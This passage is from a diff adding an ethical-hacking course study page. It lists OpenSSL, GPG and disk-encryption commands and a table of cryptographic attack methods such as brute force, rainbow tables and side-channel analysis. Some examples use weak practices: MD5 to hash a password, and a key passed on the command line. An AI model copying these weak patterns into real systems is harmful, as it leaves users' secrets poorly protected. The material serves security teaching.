+$ echo -n "password" | md5sum             # Hash a string
+
+# ═══ OpenSSL — Encryption/Decryption ═══
+# Encrypt a file
+$ openssl enc -aes-256-cbc -salt -in secret.txt -out secret.enc -k MyPassword
+# Decrypt
+$ openssl enc -d -aes-256-cbc -in secret.enc -out decrypted.txt -k MyPassword
+
+# ═══ Self-Signed Certificate ═══
+$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+# Creates: key.pem (private key) + cert.pem (self-signed certificate)
+
+# ═══ GPG — Email/File Encryption ═══
+$ gpg --gen-key                           # Generate key pair
+$ gpg -e -r recipient@email.com file.txt  # Encrypt for recipient
+$ gpg -d file.txt.gpg                     # Decrypt
+
+# ═══ Disk Encryption ═══
+# VeraCrypt: Create encrypted volume → Mount as drive → Files stored encrypted
+# BitLocker (Windows): Control Panel → BitLocker → Turn On for drive
+
+# ═══ Cryptanalysis ═══
+# CrypTool: Visual tool for learning and breaking classical ciphers
+# (Caesar, Vigenère, Substitution, Transposition)
+# Techniques: Frequency analysis, Known-plaintext, Chosen-plaintext, Birthday attack</pre>
+
+<h4>Cryptographic Attacks</h4>
+<div class="tbl"><table>
+<tr><th>Attack</th><th>Method</th></tr>
+<tr><td><strong>Brute Force</strong></td><td>Try all possible keys</td></tr>
+<tr><td><strong>Dictionary</strong></td><td>Try common passwords/keys</td></tr>
+<tr><td><strong>Birthday Attack</strong></td><td>Find hash collisions (two inputs → same hash)</td></tr>
+<tr><td><strong>Rainbow Tables</strong></td><td>Pre-computed hash lookups</td></tr>
+<tr><td><strong>Known-Plaintext</strong></td><td>Have plaintext+ciphertext pair, derive key</td></tr>
+<tr><td><strong>MITM on key exchange</strong></td><td>Intercept Diffie-Hellman exchange</td></tr>
+<tr><td><strong>Side-Channel</strong></td><td>Analyze timing, power consumption, EM radiation</td></tr>
+</table></div>
+
+</div></div>
+
+</div><!-- /content -->
+
+<div style="text-align:center;padding:24px 20px 48px;color:#475569;font-size:12px">
+CDAC PGCP-CSF Module 3 — Ethical Hacking | All 28 sessions covered. Theory + Tools + Commands. 💀🛡️
+</div>
+</body>
+</html>
